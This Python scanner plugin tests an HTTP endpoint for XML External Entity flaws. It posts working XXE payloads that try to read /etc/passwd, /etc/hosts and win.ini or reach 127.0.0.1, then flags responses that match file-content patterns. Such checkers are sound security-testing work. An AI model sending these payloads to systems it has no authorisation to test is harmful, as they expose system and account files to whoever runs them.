import json
import re

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

SERVICE = "http"
DESCRIPTION = "Taken from TFS(https://github.com/PrathyayPGM-ALT/TFS) with permission. Checks for XML External Entity (XXE) vulnerabilities in HTTP request bodies."
SCRIPT_NAME = "http-tfs-xxe"
OPTIONAL = True

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
]

XXE_SIGNS = [
    r'root:.*:0:0:',
    r'\[fonts\]',
    r'daemon:.*:/usr/sbin',
    r'/bin/bash',
    r'127\.0\.0\.1',
    r'\[extensions\]',
    r'for 16-bit app support',
]


def run(target, port, args=None):
    if not REQUESTS_OK:
        print("[!] requests not installed  ->  pip install requests")
        return

    args = args or {}
    url = args.get("url") or f"http://{target}:{port}"
    output = args.get("output")

    session = requests.Session()
    findings = []

    for payload in XXE_PAYLOADS:
        try:
            resp = session.post(
                url,
                data=payload,
                headers={"Content-Type": "application/xml"},
                allow_redirects=False,
            )
            for sign in XXE_SIGNS:
                if re.search(sign, resp.text, re.IGNORECASE):
                    print(f"[!] XXE via XML body payload={payload[:50]}")
                    print(f"[*] Matched: {sign}")
                    findings.append({
                        "type": "XXE",
                        "severity": "CRITICAL",
                        "payload": payload,
                        "evidence": sign,
                        "url": url,
                    })
                    break
        except Exception:
            pass

    print(f"[*] Findings: {len(findings)}")

    if output:
        with open(output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Saved -> {output}")
